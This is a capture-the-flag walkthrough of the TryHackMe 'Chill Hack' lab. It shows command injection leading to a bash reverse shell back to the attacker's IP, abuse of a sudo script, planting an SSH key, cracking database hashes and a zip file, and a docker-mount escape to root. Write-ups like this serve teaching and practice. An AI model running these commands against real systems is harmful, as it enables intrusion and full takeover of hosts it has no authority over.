# Chill Hack

![image](https://user-images.githubusercontent.com/5285547/127403967-7b72f2d6-60aa-4f74-8f0d-f8bbce81071c.png)

Room link: https://tryhackme.com/room/chillhack


A quick enum to get started, I usually run as a basic, nmap, nikto, gobuster as a min.

## Nmap 

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## Gobuster

```
/css                  (Status: 301) [Size: 310] [--> http://10.10.44.162/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.44.162/images/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.44.162/fonts/] 
/secret               (Status: 301) [Size: 313] [--> http://10.10.44.162/secret/]             #  Seem's intresting! 
/js                   (Status: 301) [Size: 309] [--> http://10.10.44.162/js/] 
```

## http://10.10.44.162/secret/
*replace your IP for the rooms IP

This page gives us a box with command execution (Easy!)  

![image](https://user-images.githubusercontent.com/5285547/127404324-dcb6a694-b7cc-4037-8b6c-7f8b56acf541.png)

Trying other things like "ls" gives you...  

![image](https://user-images.githubusercontent.com/5285547/127404273-9aaf970c-0d55-48db-8908-1f152db4b0e9.png)


Testing some more I quickly realise we can chain together commands using ";"
ie:
```
id;ls
```

![image](https://user-images.githubusercontent.com/5285547/127404437-9126f1a0-0442-47a4-8a65-5b2038ddea97.png)

I captured the request in burp suite and then tried a few payloads to get a revershell back. 
First I checked with a simple ping command for a result to prove the connection back. 

Kali
```
sudo tcpdump -i tun0 icmp 
```

Post request

```
POST /secret/ HTTP/1.1
Host: 10.10.44.162
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.44.162
Connection: close
Referer: http://10.10.44.162/secret/
Upgrade-Insecure-Requests: 1

command=id%3bping%20-c%201%2010.8.153.120
```

Bingo! A reply!
```
┌──(ac1d㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                          
[sudo] password for ac1d: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:35:26.127709 IP 10.10.44.162 > 10.8.153.120: ICMP echo request, id 1871, seq 1, length 64
23:35:26.127742 IP 10.8.153.120 > 10.10.44.162: ICMP echo reply, id 1871, seq 1, length 64
```

Now I test payloads to see what pings back. 

Reverse shell

Sending a bash rev shell we can get a reverse shell from the command injection we just found. 

```
command=id%3bbash%20-c%20%22%2fbin%2fbash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.8.153.120%2f9999%200%3e%261%
```
Decoded
```
command=id;bash -c "/bin/bash -i >& /dev/tcp/10.8.153.120/9999 0>&1"
```

![image](https://user-images.githubusercontent.com/5285547/127405379-d0199737-5cdb-4af3-a69b-57769ef1529f.png)


## User

Checking sudo -l as www-data shows us something intresting. 

```
Matching Defaults entries for www-data on ubuntu:                                                                                                                                     env_reset, mail_badpass,                                                                                                                                                         secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                                                 
User www-data may run the following commands on ubuntu:                                                                                                                               (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh                                                                                                                             


www-data@ubuntu:/tmp$  cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
We can run a script as the user apaar.  
The script seems to read a name and add it to the person variable.  
Then ask for a msg but never use it. 2>/dev/null
2=STDERR, so send all errors to nothing (but still executing). 

I send another ping to myself to prove its working. 

![image](https://user-images.githubusercontent.com/5285547/127407943-471032f3-c85b-4f20-a349-11b126a8f88f.png)

Then I try simply /bin/bash for a shell as the user. 

```
sudo -u apaar /home/apaar/.helpline.sh
```

![image](https://user-images.githubusercontent.com/5285547/127407970-065246c3-cde0-49d1-a1cd-ac53884cb783.png)

Now we upgrade our terminal.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Get ssh access

Now seeing the .ssh/ folder is now writable i can add my ssh public key and just login. 

Kali box
```
ssh-keygen
```

Accept all defaults and then cat the id_rsa.pub key out. 

```
cat ~/.ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQq4KtSkrifBP5HFkQ+/zrsalHvnsNI1TvefMU92X06G6XN9E2fYajOuLq/0yV1Ak57ohnNQFXSFHQBV9tB0rTFDmhaHCaGuqX+ZSMvSwHwZW32OasxAMnJPbTzSCqli58JN+GdVd81PJPNHnva1Q2WZ/cnvfc<REDACTED>0yFWnTkjx4tAZV+DG27IiOTlJSe2rUFR/eRDI7kN3d2qDiqChI/7F+ld+lqZLEHOhagYSamwGGu0t+0H39COfLX5PfhMBMKKpaaR6FR8AdYvIw6yyoNjNfnnXU2977Cn7m/Zz/l7xy+KYXRng+JBtjDbyg4jXGc=
```

Then on the attacking machine add it to the authorized_keys file. 

```
cat <<EOF > authorized_keys
#paste the key here
EOF
```

![image](https://user-images.githubusercontent.com/5285547/127408538-cd099dc8-777f-4a0f-a231-5c92725d0036.png)

Now connect to the ssh

```
ssh apaar@10.10.44.162 -i ~/.ssh/id_rsa
```

A much better terminal

![image](https://user-images.githubusercontent.com/5285547/127408800-adc970a3-4cd6-469f-bf57-5dc4a8cecab1.png)

We can now get the user flag in /home/apaar/local.txt

# Enum Round 2

Checking the rest of the system I saw the username and password for mysql in the index page for login. 

![image](https://user-images.githubusercontent.com/5285547/127409095-e1e33dbb-61a9-4dd6-b013-6c6b0ae5ac53.png)

Using the details we can login and check the databases out. 

![image](https://user-images.githubusercontent.com/5285547/127409156-103b4a38-1509-4f32-8ca5-349837258701.png)

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```

Lets see if we can crack the passwords. 

![image](https://user-images.githubusercontent.com/5285547/127409290-94d20f0a-134d-4f23-aedb-e72f5f9d3670.png)

```
anurodh:masterpassword
apaar:dontaskdonttell
```

Running linpeas again as apaar didn't show much new at all. I spent hours looking and finding not much at all. 
I seen a port running on 127.0.0.1:9001 I haden't checked out yet, so started there.

This seemed the host an apache server on port 9001, which is owned by root user. 

![image](https://user-images.githubusercontent.com/5285547/127410572-9a8e1c3c-2381-4225-96d2-72616657ac28.png)

I started to check the images with stego techniques. 

```
steghide info hacker-with-laptop_23-2147985341.jpg 
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
    
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase: 
wrote extracted data to "backup.zip".
```

Time to crack the .zip file. We can do this a few ways.

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt hacker-with-laptop_23-2147985341.jpg backup.zip 
found id e0ffd8ff, 'hacker-with-laptop_23-2147985341.jpg' is not a zipfile ver 2.xx, skipping

PASSWORD FOUND!!!!: pw == pass1word

unzip backip.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php 
```

We can get a base64 password from the file extracted.

![image](https://user-images.githubusercontent.com/5285547/127411207-bfd7ed9d-ccd5-41a8-b497-8c5f0ece0b3b.png)

Using that password for anurodh we can swap user accounts.  
Running linpeas again as anurodh shows we can use docker and its writable! (escape time)

![image](https://user-images.githubusercontent.com/5285547/127411427-8210c9a0-2caf-4255-a2e6-8baed640c9ff.png)

## Root

Listing the images shows us some continers ready to roll. 

![image](https://user-images.githubusercontent.com/5285547/127411522-b7785285-fd3f-4ca5-8b00-7454be700703.png)

I know i've used the alpine exploit to escape docker before.  
We can run the docker cm mount it with bash and save no session. 
Then grab the last flag!

```
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```  
Credits: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

![image](https://user-images.githubusercontent.com/5285547/127411757-390e0ff5-a34d-427f-a717-76253e9011e7.png)





